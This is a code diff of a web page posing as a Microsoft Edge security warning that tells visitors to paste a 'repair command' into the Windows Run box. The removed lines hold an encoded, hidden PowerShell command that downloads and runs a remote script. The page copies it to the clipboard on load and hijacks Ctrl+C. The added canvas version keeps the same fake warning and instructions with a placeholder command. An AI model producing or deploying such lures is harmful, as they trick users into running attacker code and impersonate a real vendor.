@@ -1,271 +1,255 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Microsoft Edge - Security Issues Detected</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600&display=swap');
-
-    body {
-      font-family: 'Segoe UI', system-ui, sans-serif;
-      background: #1e1e1e;
-      margin: 0;
-      padding: 40px 20px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      overflow: hidden;
-    }
-
-    .edge-popup {
-      width: 520px;
-      background: #2d2d2d;
-      border: 1px solid #0078d4;
-      border-radius: 8px;
-      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.75);
-      overflow: hidden;
-      color: #ffffff;
-      position: relative;
-    }
-
-    /* Header */
-    .header {
-      background: #1f1f1f;
-      padding: 16px 20px;
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      border-bottom: 1px solid #3a3a3a;
-    }
-
-    .warning-icon {
-      color: #f25022;
-      font-size: 32px;
-      line-height: 1;
-    }
-
-    .title {
-      font-size: 19px;
-      font-weight: 600;
-      color: #f25022;
-    }
-
-    /* Content */
-    .content {
-      padding: 24px 20px 28px;
-    }
-
-    .message {
-      font-size: 15px;
-      line-height: 1.55;
-      color: #e0e0e0;
-      margin-bottom: 26px;
-    }
-
-    .instruction {
-      font-weight: 600;
-      font-size: 15px;
-      margin-bottom: 16px;
-      color: #ffffff;
-    }
-
-    .steps {
-      margin-bottom: 28px;
-    }
-
-    .step {
-      display: flex;
-      gap: 14px;
-      margin-bottom: 14px;
-      font-size: 15px;
-    }
-
-    .step-number {
-      width: 26px;
-      height: 26px;
-      background: #3a3a3a;
-      color: #fff;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: 600;
-      flex-shrink: 0;
-      font-size: 14px;
-    }
-
-    .info {
-      background: rgba(255,255,255,0.06);
-      border: 1px solid #444;
-      border-radius: 6px;
-      padding: 16px;
-      margin-bottom: 20px;
-      font-size: 14.5px;
-      line-height: 1.5;
-      color: #d0d0d0;
-    }
-
-    .command-container {
-      background: #1a1a1a;
-      border: 1px solid #555;
-      border-radius: 4px;
-      padding: 13px 16px;
-      font-family: 'Consolas', 'Courier New', monospace;
-      font-size: 14.2px;
-      color: #9cf59c;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      word-break: break-all;
-      user-select: text;
-    }
-
-    .copy-btn {
-      color: #888;
-      cursor: pointer;
-      font-size: 20px;
-      padding: 6px 8px;
-      border-radius: 4px;
-      transition: all 0.2s;
-      user-select: none;
-    }
-
-    .copy-btn:hover {
-      color: #ffffff;
-      background: rgba(255,255,255,0.12);
-    }
-
-    .copied {
-      color: #4ade80 !important;
-      animation: pop 0.3s ease;
-    }
-
-    .command-container.highlight {
-      background: #2a3a2a;
-      border-color: #4ade80;
-      transition: all 0.4s;
-    }
-
-    @keyframes pop {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.3); }
-      100% { transform: scale(1); }
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Microsoft Edge - Security Issues Detected</title>
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    background: #1e1e1e;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+  }
+  canvas {
+    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.75);
+    border-radius: 10px;
+    cursor: default;
+  }
+</style>
 </head>
 <body>
+<canvas id="canvas" width="520" height="480"></canvas>
 
-  <div class="edge-popup">
-    <div class="header">
-      <span class="warning-icon">▲</span>
-      <div class="title">Security issues detected</div>
-    </div>
+<script>
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
 
-    <div class="content">
-      <p class="message">
-        Microsoft Edge has detected potential security threats that may compromise your browsing data.
-      </p>
+const colors = {
+  bg: '#2d2d2d',
+  headerTop: '#2a2a2a',
+  headerBottom: '#1f1f1f',
+  border: '#0078d4',
+  text: '#ffffff',
+  accent: '#f25022',
+  lightText: '#e0e0e0',
+  infoTop: 'rgba(255,255,255,0.08)',
+  infoBottom: 'rgba(255,255,255,0.02)',
+  cmdTop: '#1a1a1a',
+  cmdBottom: '#101010',
+  cmdText: '#9cf59c',
+  copyNormal: '#888',
+  copyHover: '#4ade80'
+};
 
-      <div class="instruction">You need to manually fix this:</div>
+let copied = false;
+let highlightTime = 0;
+let mouseX = 0;
+let mouseY = 0;
 
-      <div class="steps">
-        <div class="step">
-          <div class="step-number">1</div>
-          <div>Open <strong>Win + R</strong></div>
-        </div>
-        <div class="step">
-          <div class="step-number">2</div>
-          <div>Press <strong>Ctrl + V</strong></div>
-        </div>
-        <div class="step">
-          <div class="step-number">3</div>
-          <div>Press <strong>Enter</strong></div>
-        </div>
-      </div>
+const command = 'msedge.exe --fix hash=qzyd....';
 
-      <div class="info">
-        <strong>ℹ️</strong> The repair command was copied to your clipboard.<br>
-        if you're having trouble, you can manually copy and run the command below .
-      </div>
+function roundRect(ctx, x, y, w, h, r) {
+  ctx.beginPath();
+  ctx.moveTo(x + r, y);
+  ctx.lineTo(x + w - r, y);
+  ctx.quadraticCurveTo(x + w, y, x + w, y + r);
+  ctx.lineTo(x + w, y + h - r);
+  ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
+  ctx.lineTo(x + r, y + h);
+  ctx.quadraticCurveTo(x, y + h, x, y + h - r);
+  ctx.lineTo(x, y + r);
+  ctx.quadraticCurveTo(x, y, x + r, y);
+  ctx.closePath();
+}
 
-      <div class="command-container" id="commandBox">
-        <span id="command">edge.exe -fix-browser -hash="Z7sCq...</span>
-        <span class="copy-btn" id="copyBtn" title="Copy command">📋</span>
-      </div>
-    </div>
-  </div>
-
-  <script>
-    const copyBtn = document.getElementById('copyBtn');
-    const commandBox = document.getElementById('commandBox');
-    const commandText = document.getElementById('command');
-
-    const fullCommand = 'powershell -NoP -ExecutionPolicy Bypass -w Hidden -c -EncodedCommand "SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARABhAHIAawAtAFMAaABhAGQAMAB3ADQAMAA0AC8ATQBpAGMAcgBvAHMAbwBmAHQAXwBlAGQAZwBlAC8AbQBhAGkAbgAvAHMAaABpAHQALgBwAHMAMQAnACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApAC4AQwBvAG4AdABlAG4AdAA="';
-
-    function copyCommand(isAuto = false) {
-      navigator.clipboard.writeText(fullCommand).then(() => {
-        if (!isAuto) {
-          copyBtn.textContent = '✓';
-          copyBtn.classList.add('copied');
-        }
-
-        commandBox.classList.add('highlight');
-
-        setTimeout(() => {
-          if (!isAuto) {
-            copyBtn.textContent = '📋';
-            copyBtn.classList.remove('copied');
-          }
-          commandBox.classList.remove('highlight');
-        }, 1800);
-      }).catch(() => {
-        const textArea = document.createElement('textarea');
-        textArea.value = fullCommand;
-        document.body.appendChild(textArea);
-        textArea.select();
-        document.execCommand('copy');
-        document.body.removeChild(textArea);
-
-        if (!isAuto) {
-          copyBtn.textContent = '✓';
-          copyBtn.classList.add('copied');
-        }
-        commandBox.classList.add('highlight');
-
-        setTimeout(() => {
-          if (!isAuto) {
-            copyBtn.textContent = '📋';
-            copyBtn.classList.remove('copied');
-          }
-          commandBox.classList.remove('highlight');
-        }, 1800);
-      });
+function wrapText(ctx, text, x, y, maxWidth, lineHeight) {
+  const words = text.split(' ');
+  let line = '';
+  let currentY = y;
+  for (let n = 0; n < words.length; n++) {
+    const testLine = line + words[n] + ' ';
+    const metrics = ctx.measureText(testLine);
+    if (metrics.width > maxWidth && n > 0) {
+      ctx.fillText(line, x, currentY);
+      line = words[n] + ' ';
+      currentY += lineHeight;
+    } else {
+      line = testLine;
     }
+  }
+  ctx.fillText(line, x, currentY);
+}
 
-    window.addEventListener('load', () => {
+function draw() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+  // Main background
+  ctx.fillStyle = colors.bg;
+  ctx.shadowColor = 'rgba(0,0,0,0.3)';
+  ctx.shadowBlur = 16;
+  ctx.shadowOffsetX = 0;
+  ctx.shadowOffsetY = 4;
+  roundRect(ctx, 0, 0, 520, 480, 10);
+  ctx.fill();
+  ctx.shadowColor = 'transparent';
+  ctx.strokeStyle = colors.border;
+  ctx.lineWidth = 1;
+  ctx.stroke();
+
+
+  const headerGrad = ctx.createLinearGradient(0, 0, 0, 68);
+  headerGrad.addColorStop(0, colors.headerTop);
+  headerGrad.addColorStop(1, colors.headerBottom);
+  ctx.fillStyle = headerGrad;
+  roundRect(ctx, 0, 0, 520, 68, 10);
+  ctx.fill();
+  ctx.strokeStyle = '#3a3a3a';
+  ctx.beginPath();
+  ctx.moveTo(0, 68);
+  ctx.lineTo(520, 68);
+  ctx.stroke();
+
+
+  ctx.fillStyle = colors.accent;
+  ctx.font = 'bold 40px Segoe UI';
+  ctx.textAlign = 'left';
+  ctx.textBaseline = 'middle';
+  ctx.fillText('⚠', 28, 34);
+
+
+  ctx.fillStyle = colors.accent;
+  ctx.font = '600 19px Segoe UI';
+  ctx.fillText('Security issues detected', 72, 36);
+
+  let y = 100;
+
+
+  ctx.fillStyle = colors.lightText;
+  ctx.font = '15px Segoe UI';
+  wrapText(ctx, "Microsoft Edge has detected potential security threats that may compromise your browsing data.", 32, y, 456, 24);
+  y += 78;
+
+
+  ctx.fillStyle = colors.text;
+  ctx.font = '600 15px Segoe UI';
+  ctx.fillText('Follow these steps to fix it:', 32, y);
+  y += 32;
+
+
+  const steps = [
+    {num: '1', text: 'Copy the command below'},
+    {num: '2', text: 'Open Win + R'},
+    {num: '3', text: 'Press Ctrl + V and Enter'}
+  ];
+
+  steps.forEach(step => {
+    ctx.save();
+    ctx.shadowColor = 'rgba(0,0,0,0.3)';
+    ctx.shadowBlur = 4;
+    ctx.shadowOffsetX = 0;
+    ctx.shadowOffsetY = 2;
+    ctx.fillStyle = '#3a3a3a';
+    ctx.beginPath();
+    ctx.arc(46, y + 13, 13, 0, Math.PI * 2);
+    ctx.fill();
+    ctx.restore();
+
+    ctx.fillStyle = '#fff';
+    ctx.font = '600 14px Segoe UI';
+    ctx.textAlign = 'center';
+    ctx.fillText(step.num, 46, y + 18);
+
+    ctx.fillStyle = colors.text;
+    ctx.textAlign = 'left';
+    ctx.fillText(step.text, 72, y + 18);
+    y += 38;
+  });
+
+  y += 12;
+
+
+  const infoGrad = ctx.createLinearGradient(30, y, 30, y + 72);
+  infoGrad.addColorStop(0, colors.infoTop);
+  infoGrad.addColorStop(1, colors.infoBottom);
+  ctx.fillStyle = infoGrad;
+  ctx.strokeStyle = '#444';
+  roundRect(ctx, 30, y, 460, 72, 6);
+  ctx.fill();
+  ctx.stroke();
+
+  ctx.fillStyle = '#d0d0d0';
+  ctx.font = '14.5px Segoe UI';
+  ctx.fillText('ℹ️ First, copy the repair command below.', 48, y + 26);
+  ctx.fillText('Then follow the steps above to execute it.', 48, y + 48);
+
+  y += 90;
+
+
+  const cmdGrad = ctx.createLinearGradient(30, y, 30, y + 52);
+  cmdGrad.addColorStop(0, colors.cmdTop);
+  cmdGrad.addColorStop(1, colors.cmdBottom);
+  ctx.fillStyle = highlightTime > Date.now() ? '#2a3a2a' : cmdGrad;
+  ctx.strokeStyle = highlightTime > Date.now() ? '#4ade80' : '#555';
+  roundRect(ctx, 30, y, 460, 52, 4);
+  ctx.fill();
+  ctx.stroke();
+
+  ctx.fillStyle = colors.cmdText;
+  ctx.font = '14.2px Consolas, Courier New';
+  ctx.textAlign = 'left';
+  ctx.fillText(command, 48, y + 32);
+
+  const isHover = (mouseX > 430 && mouseX < 490 && mouseY > y && mouseY < y + 52) || copied;
+  ctx.textAlign = 'center';
+  ctx.fillStyle = isHover ? colors.copyHover : colors.copyNormal;
+  ctx.font = '20px Segoe UI';
+  ctx.fillText('📋', 460, y + 34);
+
+  if (copied && Date.now() - highlightTime < 1800) {
+    ctx.fillStyle = 'rgba(74,222,128,0.2)';
+    roundRect(ctx, 30, y, 460, 52, 4);
+    ctx.fill();
+  }
+}
+
+canvas.addEventListener('mousemove', e => {
+  const rect = canvas.getBoundingClientRect();
+  mouseX = e.clientX - rect.left;
+  mouseY = e.clientY - rect.top;
+  draw();
+});
+
+
+canvas.addEventListener('click', e => {
+  const rect = canvas.getBoundingClientRect();
+  const clickX = e.clientX - rect.left;
+  const clickY = e.clientY - rect.top;
+
+  
+  if (clickX > 430 && clickX < 490 && clickY > 340 && clickY < 392) {
+    navigator.clipboard.writeText(command).then(() => {
+      copied = true;
+      highlightTime = Date.now();
+      draw();
+
       setTimeout(() => {
-        copyCommand(true);
-      }, 800);
+        copied = false;
+        draw();
+      }, 1800);
+    }).catch(err => {
+      console.error('Failed to copy text: ', err);
+
+      alert('Failed to copy the command. Please copy it manually.');
     });
+  }
+});
 
-    copyBtn.addEventListener('click', () => {
-      copyCommand(false);
-    });
-
-    document.addEventListener('keydown', (e) => {
-      if ((e.ctrlKey || e.metaKey) && e.key === 'c') {
-        const selection = window.getSelection().toString();
-        if (selection.includes('edge.exe') || document.activeElement === document.body) {
-          e.preventDefault();
-          copyCommand(false);
-        }
-      }
-    });
-
-    commandBox.setAttribute('tabindex', '0');
-  </script>
-
+draw();
+</script>
 </body>
-  </html>
+</html>
